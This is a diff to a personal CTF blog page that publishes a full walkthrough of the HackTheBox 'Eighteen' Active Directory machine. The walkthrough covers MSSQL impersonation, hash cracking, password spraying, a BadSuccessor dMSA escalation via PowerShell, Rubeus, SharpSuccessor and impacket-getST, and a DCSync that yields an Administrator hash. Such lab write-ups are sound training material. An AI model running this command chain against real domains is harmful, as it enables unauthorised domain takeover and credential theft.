@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Eighteen - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Eighteen.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Eighteen machine from HackTheBox - Easy difficulty level">
+    <meta name="description" content="Detailed writeup for Eighteen machine from HackTheBox - Easy difficulty level">
     <meta name="keywords" content="HackTheBox, Eighteen, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,165 @@
         <h1 class="writeup-title">Eighteen</h1>
         <div class="writeup-metadata">
             <span class="difficulty easy">Easy</span>
-            <span class="date">Active machine</span>
+            <span class="date">April 11, 2026</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
                 <p><img alt="pwned" src="../images/Eighteen/pwned.png" /></p>
-<p>Eighteen is an ACTIVE machine!</p>
-<p>This write-up will go live once Eighteen retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+<p>Eighteen was an easy-difficulty Windows Active Directory machine that began with an nmap scan revealing an atypical domain controller layout, with HTTP on port 80, WinRM on port 5985, and MSSQL on port 1433, notably absent of DNS and Kerberos ports.
+Initial website enumeration revealed a Flask-based expense tracking application, where creating a basic account exposed limited input fields.
+Provided credentials for kevin were valid against the MSSQL service, where enumeration revealed a non-standard financial_planner database and an impersonation path to the appdev login.
+Impersonating appdev granted access to the financial_planner database, where a Werkzeug PBKDF2 password hash for the admin account was recovered. The hash required manual reformatting from its raw hex and ASCII components into base64 to match hashcat's expected input format for PBKDF2-HMAC-SHA256, after which it cracked to reveal the password iloveyou1.
+With no SMB or LDAP exposed externally, RID bruteforcing was performed over the MSSQL module in netexec to enumerate domain users. A password spray using the cracked credential against WinRM yielded a hit on adam.scott, providing an interactive remote session via evil-winrm.</p>
+<p>BloodHound enumeration with SharpHound failed to surface useful paths due to the legacy version in use. PowerView was instead used to enumerate ACLs directly, revealing that the IT group, of which adam.scott was a member, held CreateChild rights over the Staff Organizational Unit.
+Running on Windows Server 2025, this configuration was vulnerable to the BadSuccessor attack, which abuses delegated Managed Service Accounts to impersonate arbitrary principals including domain administrators.
+A Ligolo tunnel was established to expose the DC's internal ports, making Kerberos and LDAP accessible. SharpSuccessor was used to create a malicious dMSA account in the Staff OU preconfigured to precede the Administrator account.
+Impacket-getST was then used with the dmsa flag to request a service ticket impersonating the dMSA, which carried Administrator-level privileges. The ticket was used with netexec to perform a DCSync and recover the Administrator's NTLM hash, granting full access to the domain controller.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Eighteen/nmap.png" /></p>
+<p>Initial nmap scan reveals just 3 ports. HTTP on 80 and 5985, and MSSQL on 1443.</p>
+<p>This seems to be a Domain Controller, but there are no ports for DNS(53) nor Kerberos(88)... I'm wondering how the lack of those 2 might affect my tool usage in this scenario.</p>
+<h2>Checking out the website</h2>
+<p><img alt="website" src="../images/Eighteen/website.png" /></p>
+<p>Initial credentials for Kevin don't work as a valid website login, so I'll make a basic account to explore the site.</p>
+<p><img alt="logged" src="../images/Eighteen/logged.png" /></p>
+<p>There are 3 input fields, from which only the category field accepts all characters. The other fields accept only integers.</p>
+<p>After trying manual SQLi enumeration for a while, I threw the following request into sqlmap. The parameter was deemed not injectable.</p>
+<pre class="codehilite"><code>POST /add_expense HTTP/1.1
+Host: eighteen.htb
+Content-Length: 30
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Origin: http://eighteen.htb
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://eighteen.htb/dashboard
+Accept-Encoding: gzip, deflate, br
+Cookie: session=.eJyrVkorzcmJz0vMTVWyUspS0lEqLU4tis9MUbIyNDAwhXDhsrUAcFIO6w.adnJow.ZdBcl-LAlhS1Om57JhO5ZLp8SEM
+Connection: keep-alive
+
+category=*&amp;type=fixed&amp;value=10
+</code></pre>
+
+<p><img alt="sqlmap" src="../images/Eighteen/sqlmap.png" /></p>
+<h2>MSSQL service exploration</h2>
+<p>I'll check whether Kevin's credentials work for the MSSQL service.</p>
+<p><code>impacket-mssqlclient eighteen.htb/kevin:'iNa2we6haRj2gaw!'@eighteen.htb</code></p>
+<p><img alt="enum" src="../images/Eighteen/enum.png" /></p>
+<p>There is a non-standard DB(financial_planner), and a user <code>appdev</code>. Kevin cannot access the DB, nor can they enumerate it whatsoever.</p>
+<p>I'll check what kind of permissions Kevin has and what I can use to move forward.</p>
+<p><img alt="impersonate" src="../images/Eighteen/impersonate.png" /></p>
+<p>(If MSSQL is used from a local port within a box, the following query can be used to achieve a similar result:</p>
+<p><code>SELECT sp.name AS grantor, sp2.name AS grantee, sp3.name AS target_login, perm.permission_name, perm.state_desc FROM sys.server_permissions perm JOIN sys.server_principals sp ON perm.grantor_principal_id = sp.principal_id JOIN sys.server_principals sp2 ON perm.grantee_principal_id = sp2.principal_id JOIN sys.server_principals sp3 ON perm.major_id = sp3.principal_id WHERE perm.permission_name = 'IMPERSONATE';</code>
+)</p>
+<p>Kevin can impersonate the appdev. This user might have access to the planner DB, so I'll take them over right away.</p>
+<pre class="codehilite"><code>EXECUTE AS LOGIN 'appdev' -&gt; Impersonate appdev
+
+select table_name from information_schema.tables -&gt; Enumerate tables in the DB
+</code></pre>
+
+<p><img alt="admin" src="../images/Eighteen/admin.png" /></p>
+<p>This admin hash is the only entry in the user's table. The iteration count is pretty high, and it is a PBKDF2 hash, but I'll try cracking it either way.</p>
+<h2>Cracking the admin hash</h2>
+<p><img alt="fail" src="../images/Eighteen/fail.png" /></p>
+<p>...Or I would, if it were in a hashcat-favorable format. Initial website enumeration revealed that this is a Flask app(via 404 page enumeration), and the most commonly used password hashing solution comes from <code>Werkzeug</code>.</p>
+<p>This matches the hash, as Werkzeug uses pbkdf2 + sha256 + salt for its hashes. The example hashcat entry for <code>PBKDF2-HMAC-SHA256</code> is <code>sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt</code>. It has no PBKDF2 prefix and uses base64 for both the salt and the hash. I'll convert both sections into the appropriate formats.</p>
+<p><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
+<p><code>echo -n 0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133 | xxd -r -p | base64 -&gt; From hex to raw bytes, to base64</code></p>
+<p><code>echo -n AMtzteQIG7yAbZIa | base64 -&gt; Plain ASCII to base64</code></p>
+<p><img alt="cracked" src="../images/Eighteen/cracked.png" /></p>
+<p><code>admin | iloveyou1</code></p>
+<p>I'll log into the website with these credentials, because earlier I saw a previously-inaccessible administrator endpoint.</p>
+<p><img alt="admindash" src="../images/Eighteen/admindash.png" /></p>
+<h2>RID bruteforcing and password spray</h2>
+<p>The admin dashboard holds nothing of use to me. I haven't done a password spray yet, and I have a new credential now. This is the best time to go forward with this attack.</p>
+<p>Since both SMB and LDAP ports are not open to me, I will use netexec with the MSSQL module to perform an RID brute force.</p>
+<p><code>nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute 2000</code></p>
+<p>I'll save the output into a separate file by piping this command to awk.</p>
+<p><code>awk -F '\' '{ print $2 }' &gt; userlist</code></p>
+<p><img alt="userlist" src="../images/Eighteen/userlist.png" /></p>
+<p>I already know that there are no more interesting accounts to own for the MSSQL service. The only open port that's untouched is WinRM on 5985, which will allow remote logon for any user whose credentials are accepted.</p>
+<p><code>nxc winrm eighteen.htb -u userlist -p passlist --continue-on-success</code></p>
+<p><img alt="spray" src="../images/Eighteen/spray.png" /></p>
+<p><code>adam.scott | iloveyou1</code></p>
+<p>Adam Scott has remote access to the box. I'll use evil-winrm-py to connect to DC01.</p>
+<p><img alt="user" src="../images/Eighteen/user.png" /></p>
+<h1>Root flag</h1>
+<p>With direct access to the machine, I'll look for interesting permissions using Bloodhound. I'm using the legacy version because my device is not powerful enough for CE...</p>
+<p><a href="https://github.com/SpecterOps/BloodHound-Legacy">https://github.com/SpecterOps/BloodHound-Legacy</a></p>
+<p><a href="https://github.com/SpecterOps/BloodHound-Legacy/tree/master/Collectors">https://github.com/SpecterOps/BloodHound-Legacy/tree/master/Collectors</a></p>
+<p>I will upload SharpHound onto the box to enumerate the domain.</p>
+<p><img alt="sharphound" src="../images/Eighteen/sharphound.png" /></p>
+<p>However, Bloodhound does not show any interesting permissions of adam.scott in the graph. It could be because this is a legacy version from 3 years ago. This is a great example of why one should not rely on a singular tool for doing things.</p>
+<h2>Using PowerView to discover ACL permissions</h2>
+<p>I'll use <code>PowerView</code> to perform recon from within my remote session. This way, I'll be able to see everything that I want "raw" without certain entries being hidden.</p>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
+<p><code>. .\PowerView.ps1 -&gt; Import the PS1 module after download</code></p>
+<p><img alt="powerview" src="../images/Eighteen/powerview.png" /></p>
+<p>PowerView contains tons of useful functions, but the one I want right now is <code>Find-InterestingDomainAcl</code> to see exactly what adam.scott is allowed to do.</p>
+<p><img alt="createchild" src="../images/Eighteen/createchild.png" /></p>
+<p>The custom <code>IT</code> group has <code>CreateChild</code> over the <code>Staff</code> Organizational Unit. This permission creates a prime opportunity for Administrator-level escalation, if certain conditions are met.</p>
+<h2>BadSuccessor exploitation</h2>
+<p>From the netexec usage during the user flag portion of the box, I know that this is a Windows Server 2025 machine. There is a certain, well-known by this point, escalation path affecting the newest instance of Windows Server.</p>
+<p><a href="https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory">https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory</a></p>
+<p>Essentially, this allows me to "precede" any account I want to target, including administrators. I tried to exploit this manually with the following command chain, but I must've missed something because I could not get the desired permissions.</p>
+<pre class="codehilite"><code>New-ADComputer -Name &quot;TESTPC&quot; -SamAccountName &quot;TESTPC$&quot; -Path &quot;OU=Staff,DC=eighteen,DC=htb&quot; -&gt; Create a computer account. This is because I'll be using delegation, for which computer accounts are already well-suited
+
+Set-ADAccountPassword -Identity &quot;TESTPC$&quot; -Reset -NewPassword (ConvertTo-SecureString &quot;Password123&quot; -AsPlainText -Force) -&gt; Change the account's password to a known value
+
+New-ADServiceAccount -Name &quot;mal_dMSA&quot; -DNSHostName &quot;random.l&quot; -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword &quot;TESTPC$&quot; -Path &quot;OU=Staff,DC=eighteen,DC=htb&quot; -&gt; Creates a dMSA account in the affected OU
+
+
+$dMSA = [ADSI]&quot;LDAP://CN=mal_dMSA,OU=Staff,DC=eighteen,DC=htb&quot; -&gt; Set up a connection to Active Directory Service Interfaces
+
+$dMSA.put(&quot;msDS-DelegatedMSAState&quot;, 2) -&gt; Set up the attributes necessary for BadSuccessor
+
+$dMSA.put(&quot;msDS-ManagedAccountPrecededByLink&quot;, &quot;CN=Administrator,CN=Users,DC=eighteen,DC=htb&quot;) -&gt; Setting administrator as the account to precede. Ideally, this would cause our mal_dMSA to be granted administrator's specifics, like group memberships
+
+Add-DomainObjectAcl ` -TargetIdentity &quot;CN=mal_dMSA,OU=Staff,DC=eighteen,DC=htb&quot; ` -PrincipalIdentity &quot;eighteen.htb\adam.scott&quot; ` -Rights All -&gt; Grant adam.scott FullControl rights over the dMSA. This is so that we can actually apply the changes made via ADSI, as right now they are just sitting in memory, not actually applied.
+
+$dMSA.SetInfo() -&gt; Apply the changes
+
+
+.\Rubeus.exe asktgt /user:&quot;TESTPC$&quot; /password:Password123 /nowrap /enctype:aes256 -&gt; Request a TGT for our malicious computer
+
+.\Rubeus.exe asktgs /targetuser:&quot;mal_dMSA$&quot; /service:krbtgt/eighteen.htb /dmsa /opsec /nowrap /ptt /ticket:&lt;B64_TICKET&gt; -&gt; Request a TGS to krbtgt for our dMSA, using the computer TGT received earlier
+</code></pre>
+
+<p><img alt="failuer" src="../images/Eighteen/failure.png" /></p>
+<p>This whole manual chain failed for some reason. If it had worked, I would be able to access the <code>C$</code> share via SMB, but that did not happen.</p>
+<h2>Abusing BadSuccessor with local port access and tools</h2>
+<p>I want to access the internal ports(Mostly Kerberos and LDAP) of the DC. To do so, I will use an approach identical to the one used in <a href="https://hexphased.github.io/hexicon-archives/machines/Signed.html#escalation-with-ntlm-reflection-cve">Signed</a>, which involves creating a "magic" tunnel with Ligolo.</p>
+<p><img alt="scan" src="../images/Eighteen/scan.png" /></p>
+<p>The DC is now accessible via the IP address <code>240.0.0.1</code>. To perform the attack, I will need 2 tools:</p>
+<pre class="codehilite"><code>getST.py from impacket
+
+SharpSuccessor.exe
+</code></pre>
+
+<p>I have both of these on my box already. I'll transfer SharpSuccessor onto the box.</p>
+<p><a href="https://github.com/logangoins/SharpSuccessor">https://github.com/logangoins/SharpSuccessor</a></p>
+<p><code>.\SharpSuccessor.exe add /impersonate:Administrator /path:"ou=staff,dc=eighteen,dc=htb" /account:adam.scott /name:evil_dMSA</code></p>
+<p><img alt="sharpsuccessor" src="../images/Eighteen/sharpsuccessor.png" /></p>
+<p>Then I'll try to impersonate the administrator by requesting a service ticket with impacket-getST.</p>
+<p><code>faketime '2026-04-12 01:10:15' impacket-getST eighteen.htb/adam.scott:iloveyou1 -impersonate 'evil_dMSA$' -self -dmsa -dc-ip 240.0.0.1</code></p>
+<p><img alt="service" src="../images/Eighteen/service.png" /></p>
+<p>And this ticket can be used to perform admin-level actions against the domain.</p>
+<p><img alt="hashes" src="../images/Eighteen/hashes.png" /></p>
+<p><code>administrator | 0b133be956bfaddf9cea56701affddec</code></p>
+<p>The hash from NTDS is preferred, as it will always be the most "recent" credential for a user. This is because the NTDS database is the main AD database, and so it must always have the most recent information. The netexec command can be substituted for impacket-secretsdump, with a similar result.</p>
+<p><img alt="root" src="../images/Eighteen/root.png" /></p>
+<p>Rooted! However, I am curious about one thing. I'll rerun the two Rubeus commands just like before...</p>
+<p><img alt="rubeus" src="../images/Eighteen/rubeus.png" /></p>
+<p>Instead of trying to pass the ticket within the shell itself, I copied the b64 kirbi ticket onto my box and converted it into a .ccache format.</p>
+<p><img alt="works" src="../images/Eighteen/works.png" /></p>
+<p>And this actually worked! This means that if I were to find a way to authenticate with this ticket directly within the evil-winrm shell, I could potentially gain administrative access without needing the ligolo tunnel!</p>
+<p>This would be a good thing to learn how to do for future OPSEC, but I'll tinker with it more when I'll have time.</p>
+<p>For now, Rooted(2)!</p>
             </div>
             
             <div class="toc-sidebar">
@@ -87,7 +236,7 @@
     
     <footer>
         <div class="container">
-            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+            <p>&copy; 2026 Hexicon Archives | Created by Hexicon</p>
         </div>
     </footer>
 
